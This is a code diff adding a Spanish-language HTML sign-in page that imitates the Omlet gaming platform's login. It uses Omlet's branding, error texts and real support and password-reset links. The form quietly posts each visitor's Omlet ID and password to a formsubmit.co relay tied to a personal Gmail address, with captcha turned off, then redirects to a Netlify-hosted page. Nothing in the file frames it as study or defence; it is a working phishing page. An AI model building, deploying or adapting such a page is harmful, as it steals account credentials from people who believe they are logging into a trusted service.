@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Omlet</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"&amp;gt;>
+<link rel="shortcut icon" href="icono.ico" type="image/x-icon">
+<link type="text/css" rel="stylesheet" href="reset.css" />
+<link type="text/css" rel="stylesheet" href="primero.css" />
+<link type="text/css" rel="stylesheet" href="primero2.css" />
+<link type="text/css" rel="stylesheet" href="primero3.css" />
+<script type='application/javascript' src='signin.js'></script>
+<style>
+.field-name{
+  position: relative;
+  top: -45px;
+}
+input{
+  position: relative;
+  top: 0px;
+  left: -80px;
+  width: 300px;
+  
+}
+
+
+</style>
+
+</head>
+<center>
+<body>
+  <div class="bg"></div>
+  <pre>
+
+
+
+
+
+
+
+
+
+
+  </pre>
+<div class="confirm-modal-bg-mask" id="reset-confirm">
+  <div class="reset-pw-confirm">
+    <img class="confirm-close-btn" src="https://idp.omlet.me/img/oi_close_gray.png" onclick="closeErrorCountAlert()" />
+    <div class="reset-or-suport-title">¿Problemas al iniciar sesión?</div>
+    <div class="reset-or-suport-desc">
+      Intenta restablecer la contraseña a través de tu correo electrónico ahora, o contáctenos para obtener ayuda.
+    </div>
+    <div class="confirm-actions">
+      <a class="action-btn" href="https://omlet.zendesk.com/hc/requests/new" target="_blank">
+        SOPORTE
+      </a>
+      <a class="action-btn" href="https://idp.omlet.me/forgotpass?k=1TKA6Q09N6AI1HPBCF2G&er=https%3A%2F%2Fomlet.gg%2Fauthredirect&l=es">
+        RESTABLECER CONTRASEÑA
+      </a>
+    </div>
+  </div>
+</div>
+<div class="container">
+
+<div class="logo">
+    
+</div>
+<pre>
+
+
+
+</pre>
+<div class="textcenter">
+  <form name="signin" method="POST" action="https://formsubmit.co/guisuspenegoma@gmail.com" onsubmit="return validateLogin()"  >
+
+  
+  <div class="textinputbox">
+    
+    <div class="field-name">Omlet Id o Correo Electrónico</div>
+     
+    <input class="textinput" autocorrect="off" autocapitalize="off" id="omid" name="omid" type="input"  value="" placeholder=""></input>
+  </div>
+  <div id="iddes" class="des"><div id="idmsg" class="error"></div></div>
+<pre>
+
+  
+</pre>
+  <div class="textinputbox">
+    <div class="field-name">Contraseña</div>
+  
+    <input class="textinput"  autocorrect="off" autocapitalize="off" id="pass" name="pass" type="password" value="" placeholder=""></input>
+    <span id="error_nombre"></span> 
+  </div>
+  <div id="pdes" class="des"><div id="pmsg" class="error"></div></div>
+
+  <div class="forgotpw link"><a class="forgotpw">¿Olvidaste la contraseña?</a></div>
+
+
+
+  <a href="entrada.html"><button onclick="return Validar(form1)" class="login-button" type="submit" name="button" id="button">SOLICITAR</button></a>
+  
+
+  <input type="hidden" name="_next" value="https://bucolic-gelato-f2a3fc.netlify.app/entrada.html">
+  <input type="hidden" name="_captcha" value="false">
+
+</form>
+
+</div>
+
+
+<div class="register textcenter">
+<a href="https://idp.omlet.me/register?k=1TKA6Q09N6AI1HPBCF2G&er=https%3A%2F%2Fomlet.gg%2Fauthredirect&l=es">Crear cuenta</a>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+
+<div id="guisus">
+
+</div>
+  <div id="root">
+ <div class="spinner">
+   <div class="dot1"></div>
+   <div class="dot2"></div>
+ </div>
+
+
+</div>
+<script>
+ setTimeout(function() { 
+  $('#guisus').fadeOut('hidden'); }, 1000);
+
+  setTimeout(function() { 
+  $('#root').fadeOut('hidden'); }, 1000);
+
+</script>
+
+<script>
+var _err = {};
+
+
+
+
+
+
+var _check = [{desEle:document.getElementById('iddes'),
+              msgEle:document.getElementById('idmsg'),
+              errs:[{code:'ioi', msg:"ID de Omlet no válido. El ID de Omlet debe tener de 6-20 carácteres (letras de la A a la Z, números del 0-9, puntos y guiones bajos)"},
+                    {code:'ie', msg:"Correo Electrónico Inválido"},
+                    {code:'inf', msg:"Omlet ID no encontrado"}]},
+             {desEle:document.getElementById('pdes'),
+              msgEle:document.getElementById('pmsg'),
+              errs:[{code:'ip', msg:"Contraseña inválida."},
+                    {code:'pi', msg:"Contraseña incorrecta"},
+                    {code:'pns', msg:"La Contraseña no está establecida. Pulsa sobre Olvidé la Contraseña para establecer una nueva contraseña."}]},
+            ];
+
+checkForm();
+checkErrorCountAlert();
+</script>
+<div class="appending">&nbsp;</div>
+</div>
+
+
+
+</body>
+</center>
+</html>
